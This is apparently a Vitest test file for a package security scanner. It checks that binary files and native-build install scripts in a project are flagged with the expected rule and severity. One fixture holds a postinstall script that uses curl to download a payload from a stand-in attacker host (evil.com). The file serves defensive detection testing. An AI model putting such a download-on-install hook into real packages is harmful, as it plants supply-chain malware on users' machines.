import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import { scan } from "../scanner.js";

describe("Binary/Native Addon Detection (T-007)", () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join("/tmp", "scg-binary-test-"));
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  it("should detect .node binary files", async () => {
    fs.writeFileSync(path.join(tempDir, "addon.node"), "BINARY_CONTENT");

    const report = await scan({ target: tempDir, format: "text" });
    const finding = report.findings.find(
      (f) => f.rule === "BINARY_UNEXPECTED",
    );
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe("high");
    expect(finding!.file).toBe("addon.node");
  });

  it("should detect .so shared library files", async () => {
    fs.writeFileSync(path.join(tempDir, "libcrypto.so"), "BINARY_CONTENT");

    const report = await scan({ target: tempDir, format: "text" });
    const finding = report.findings.find(
      (f) => f.rule === "BINARY_UNEXPECTED",
    );
    expect(finding).toBeDefined();
  });

  it("should detect .dll files", async () => {
    fs.writeFileSync(path.join(tempDir, "malware.dll"), "BINARY_CONTENT");

    const report = await scan({ target: tempDir, format: "text" });
    const finding = report.findings.find(
      (f) => f.rule === "BINARY_UNEXPECTED",
    );
    expect(finding).toBeDefined();
  });

  it("should detect .dylib files", async () => {
    fs.writeFileSync(path.join(tempDir, "lib.dylib"), "BINARY_CONTENT");

    const report = await scan({ target: tempDir, format: "text" });
    const finding = report.findings.find(
      (f) => f.rule === "BINARY_UNEXPECTED",
    );
    expect(finding).toBeDefined();
  });

  it("should detect .exe files", async () => {
    fs.writeFileSync(path.join(tempDir, "payload.exe"), "BINARY_CONTENT");

    const report = await scan({ target: tempDir, format: "text" });
    const finding = report.findings.find(
      (f) => f.rule === "BINARY_UNEXPECTED",
    );
    expect(finding).toBeDefined();
  });

  it("should flag binaries in known native packages as info-level", async () => {
    // Create a directory structure mimicking a known native package
    const sharpDir = path.join(tempDir, "sharp");
    fs.mkdirSync(sharpDir, { recursive: true });
    fs.writeFileSync(path.join(sharpDir, "sharp.node"), "BINARY_CONTENT");

    const report = await scan({ target: tempDir, format: "text" });
    const finding = report.findings.find(
      (f) => f.rule === "BINARY_KNOWN_NATIVE" && f.file?.includes("sharp"),
    );
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe("info");
  });

  it("should detect node-pre-gyp in install scripts", async () => {
    const pkg = {
      name: "suspicious-native",
      version: "1.0.0",
      scripts: {
        install: "node-pre-gyp install --fallback-to-build",
      },
    };
    fs.writeFileSync(
      path.join(tempDir, "package.json"),
      JSON.stringify(pkg, null, 2),
    );

    const report = await scan({ target: tempDir, format: "text" });
    const finding = report.findings.find(
      (f) => f.rule === "BINARY_PREGYP_DOWNLOAD",
    );
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe("medium");
  });

  it("should detect prebuild-install in scripts", async () => {
    const pkg = {
      name: "suspicious-prebuild",
      version: "1.0.0",
      scripts: {
        install: "prebuild-install || node-gyp rebuild",
      },
    };
    fs.writeFileSync(
      path.join(tempDir, "package.json"),
      JSON.stringify(pkg, null, 2),
    );

    const report = await scan({ target: tempDir, format: "text" });
    const finding = report.findings.find(
      (f) => f.rule === "BINARY_PREBUILD_INSTALL",
    );
    expect(finding).toBeDefined();
  });

  it("should detect direct binary downloads in install scripts", async () => {
    const pkg = {
      name: "evil-binary-dl",
      version: "1.0.0",
      scripts: {
        postinstall: 'curl https://evil.com/payload.node -o addon.node',
      },
    };
    fs.writeFileSync(
      path.join(tempDir, "package.json"),
      JSON.stringify(pkg, null, 2),
    );

    const report = await scan({ target: tempDir, format: "text" });
    const finding = report.findings.find(
      (f) => f.rule === "BINARY_DIRECT_DOWNLOAD",
    );
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe("high");
  });

  it("should downgrade severity for known native packages using prebuild", async () => {
    const pkg = {
      name: "better-sqlite3",
      version: "9.0.0",
      scripts: {
        install: "prebuild-install -r napi || node-gyp rebuild",
      },
    };
    fs.writeFileSync(
      path.join(tempDir, "package.json"),
      JSON.stringify(pkg, null, 2),
    );

    const report = await scan({ target: tempDir, format: "text" });
    const finding = report.findings.find(
      (f) => f.rule === "BINARY_PREBUILD_INSTALL",
    );
    expect(finding).toBeDefined();
    // Known native packages get info severity instead of medium
    expect(finding!.severity).toBe("info");
  });

  it("should not produce false positives for normal JS files", async () => {
    fs.writeFileSync(
      path.join(tempDir, "index.js"),
      'const express = require("express");\napp.listen(3000);',
    );

    const report = await scan({ target: tempDir, format: "text" });
    const binary = report.findings.find(
      (f) => f.rule.startsWith("BINARY_"),
    );
    expect(binary).toBeUndefined();
  });
});
